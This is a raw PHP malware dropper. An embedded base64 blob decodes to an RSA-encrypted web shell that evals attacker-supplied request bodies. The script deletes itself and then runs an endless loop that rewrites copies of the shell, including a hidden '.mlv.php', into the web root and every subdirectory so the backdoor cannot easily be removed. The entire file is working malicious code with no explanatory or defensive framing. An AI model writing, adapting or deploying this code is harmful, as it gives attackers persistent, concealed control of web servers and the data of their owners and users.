<?php
    set_time_limit(0);
    ignore_user_abort(1);

    $shell = <<<EOT
PD9waHAKCmNsYXNzIFJTQQp7CiAgICBwcml2YXRlIHN0YXRpYyAkUFVCTElDX0tFWSA9IDw8PEVPRgotLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLQpNSUdmTUEwR0NTcUdTSWIzRFFFQkFRVUFBNEdOQURDQmlRS0JnUUNFWU9uMDZ1MXpWSVc0NHNNWEMvclREZ3FCCjNlcmN5MUEycHRlSjFMc0Flc1BSZ2dsSXlzUFhhR3BXckVndFkxOXRHVEMrcm5yMTVibWNJS0ZLb3BOamkyQTcKbjZXN29raFdubWNsY1VJbFlWUVVGd0tnamZpUG5hTTA5Z3BFWk5EYVJUaXJ5S3lJNjZYZ1hQMFd0Mm5zWUQyWQpETllML0l6MzJ6elFFejdpcndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCkVPRjsKCiAgICBwcml2YXRlIHN0YXRpYyBmdW5jdGlvbiBnZXRQdWJsaWNLZXkoKQogICAgewogICAgICAgIHJldHVybiBvcGVuc3NsX3BrZXlfZ2V0X3B1YmxpYyhzZWxmOjokUFVCTElDX0tFWSk7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBwdWJsaWNFbmNyeXB0KCRkYXRhID0gJycpCiAgICB7CiAgICAgICAgaWYgKCFpc19zdHJpbmcoJGRhdGEpKSB7CiAgICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH0KICAgICAgICAkcmVzID0gJyc7CiAgICAgICAgZm9yZWFjaCAoc3RyX3NwbGl0KCRkYXRhLCAxMTcpIGFzICRjaHVuaykgewogICAgICAgICAgICBvcGVuc3NsX3B1YmxpY19lbmNyeXB0KCRjaHVuaywgJGVuY3J5cHREYXRhLCBzZWxmOjpnZXRQdWJsaWNLZXkoKSk7CiAgICAgICAgICAgICRyZXMgLj0gJGVuY3J5cHREYXRhOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHJlcyA/IGJhc2U2NF9lbmNvZGUoJHJlcykgOiBudWxsOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcHVibGljRGVjcnlwdCgkZGF0YSA9ICcnKQogICAgewogICAgICAgIGlmICghaXNfc3RyaW5nKCRkYXRhKSkgewogICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICB9CiAgICAgICAgJHJlcyA9ICcnOwogICAgICAgIGZvcmVhY2ggKHN0cl9zcGxpdChiYXNlNjRfZGVjb2RlKCRkYXRhKSwgMTI4KSBhcyAkY2h1bmspIHsKICAgICAgICAgICAgb3BlbnNzbF9wdWJsaWNfZGVjcnlwdCgkY2h1bmssICRkZWNyeXB0RGF0YSwgc2VsZjo6Z2V0UHVibGljS2V5KCkpOwogICAgICAgICAgICAkcmVzIC49ICRkZWNyeXB0RGF0YTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICgkcmVzKSA/ICRyZXMgOiBudWxsOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2Rlc3RydWN0KCkKICAgIHsKICAgICAgICAkcmV0ID0gc2VsZjo6cHVibGljRGVjcnlwdCh0cmltKGZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpKSk7CiAgICAgICAgb2Jfc3RhcnQoKTsKICAgICAgICBldmFsKCRyZXQpOwogICAgICAgICRyZXQgPSBvYl9nZXRfY29udGVudHMoKTsKICAgICAgICBvYl9lbmRfY2xlYW4oKTsKICAgICAgICBlY2hvIHNlbGY6OnB1YmxpY0VuY3J5cHQoJHJldCk7CiAgICB9Cn0KCm5ldyBSU0EoKTsK
EOT;

    function writeShell($path)
    {
        global $shell;
        foreach (['mlv','.mlv'] as $t) {
            $tmp = $path . DIRECTORY_SEPARATOR . $t . ".php";
            file_put_contents($tmp, base64_decode($shell));
            @chmod($tmp, 0550);
        }
    }
    function walkDir($path, $cb=null)
    {
        $list = glob($path . DIRECTORY_SEPARATOR . '*');
        foreach ($list as $f) {
            print_r($f . "\n");
            if (is_dir($f)) {
                writeShell($f);
            }
        }
    }

    unlink(__FILE__);
    $path = (file_exists($path.DIRECTORY_SEPARATOR."index.php") && $_SERVER['DOCUMENT_ROOT'] != "") ? $_SERVER['DOCUMENT_ROOT'] : "./";
    while (1) {
        writeShell($path);
        walkDir($path);
        usleep(50);
    }
